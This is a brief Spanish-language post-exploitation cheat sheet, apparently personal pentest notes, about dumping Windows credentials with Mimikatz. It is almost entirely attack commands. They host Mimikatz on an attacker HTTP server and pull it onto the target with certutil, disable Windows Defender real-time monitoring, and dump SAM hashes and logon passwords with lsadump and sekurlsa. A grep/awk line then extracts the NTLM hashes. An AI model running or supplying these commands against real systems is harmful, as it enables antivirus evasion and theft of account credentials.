

# SUBIR MIMIKATZ
```shell
❯ wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.7z
❯ 7z x mimikatz_trunk.7z
❯ cd x64
❯ sudo python3 -m http.server 80

PS C:\ProgramData> certutil.exe -f -urlcache -split http://192.168.45.193/mimikatz.exe mimikatz.exe
```

# DESACTIVAR WINDOWS DEFENDER
```shell
PS C:\ProgramData> Set-MpPreference -DisableRealtimeMonitoring $true
```

# HASHES
```shell
#UPLOAD
❯ wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.7z
❯ 7z x mimikatz_trunk.7z
❯ cd x64
❯ sudo python3 -m http.server 80

PS C:\ProgramData> certutil.exe -f -urlcache -split http://10.10.16.7/mimikatz.exe mimikatz.exe
PS C:\ProgramData> .\mimikatz.exe "exit"

#EXTRAER HASHES
PS C:\ProgramData> .\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

#EXTRAER CON EXPRESIONES REGULARES.
#Copiar a un archivo data de nuestra máquina local.
❯ cat data | grep "NTLM:" | awk 'NF{print $NF}'
```


### POST EXPLOTACIÓN
```python

❯ wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.7z
❯ 7z x mimikatz_trunk.7z
❯ cd x64
❯ sudo python3 -m http.server 80

PS C:\ProgramData> certutil.exe -f -urlcache -split http://192.168.45.189/mimikatz.exe mimikatz.exe

.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonPasswords" "exit"


# TAMBIEN SE PUEDE HACER CON EL SECRETS DUMP


#LOCAL 
mimikatz.exe "lsadump::sam /system:C:\windows.old\Windows\System32\SYSTEM /sam:C:\windows.old\Windows\System32\SAM" exit

```


certutil.exe -f -urlcache -split http://10.10.208.147:1234/mimikatz.exe mimikatz.exe